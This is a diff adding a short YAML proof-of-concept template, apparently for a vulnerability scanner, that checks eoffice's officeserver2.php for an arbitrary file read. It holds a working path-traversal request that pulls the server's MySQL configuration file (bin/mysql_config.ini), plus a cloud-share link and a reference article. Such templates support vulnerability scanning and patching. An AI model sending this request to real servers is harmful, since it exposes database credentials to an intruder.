@@ -1,0 +1,13 @@
+name: poc-yaml-eoffice-officeserver2-read-file
+rules:
+  - method: GET
+    path: /iweboffice/officeserver2.php?OPTION=LOADTEMPLATE&COMMAND=INSERTFILE&TEMPLATE=../../bin/mysql_config.ini
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.body.bcontains(b'<DBSTEP>')
+detail:
+  author: test
+  info: |
+    链接：https://pan.baidu.com/s/1nD6MqWkQXX-AZ4hIQH2AzA 提取码：z2w7
+  links:
+    - https://www.freebuf.com/articles/web/379843.html
